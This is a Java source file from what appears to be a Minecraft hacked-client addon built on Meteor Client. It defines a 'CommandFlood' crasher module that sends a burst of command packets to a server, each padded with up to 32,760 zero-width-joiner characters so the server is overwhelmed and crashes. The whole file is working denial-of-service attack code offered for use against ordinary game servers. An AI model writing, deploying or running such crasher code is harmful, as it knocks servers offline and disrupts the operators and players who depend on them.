package com.haykkonen.lanyard.modules.crashers.flood;

import com.haykkonen.lanyard.Lanyard;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.StringSetting;
import net.minecraft.network.listener.ServerPlayPacketListener;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

import java.util.function.Supplier;

public class CommandFloodCrash extends AbstractPacketFloodCrasher<ServerPlayPacketListener> {

    private final Setting<String> command = sgGeneral.add(new StringSetting.Builder()
        .name("command")
        .description("The command to spam. Use 'skill' for the default skill command.")
        .defaultValue("skill")
        .build()
    );

    private final Setting<Integer> buffer = sgGeneral.add(new IntSetting.Builder()
        .name("buffer")
        .description("The size of the spam buffer.")
        .defaultValue(32760)
        .min(0)
        .max(32760)
        .sliderMax(32760)
        .build()
    );

    public CommandFloodCrash() {
        super(Lanyard.CATEGORY_CRASH, "CommandFlood", "Floods the server with a command spam.");
        this.amount.set(15);
    }

    @Override
    protected Supplier<Packet<ServerPlayPacketListener>> createPacketSupplier() {
        String userCommand = command.get();

        if (userCommand.startsWith("/")) userCommand = userCommand.substring(1);

        String payload = userCommand + " " + SPAM_CHAR_ZWJ.repeat(buffer.get());

        final Packet<ServerPlayPacketListener> packet = new CommandExecutionC2SPacket(payload);

        return () -> packet;
    }
}
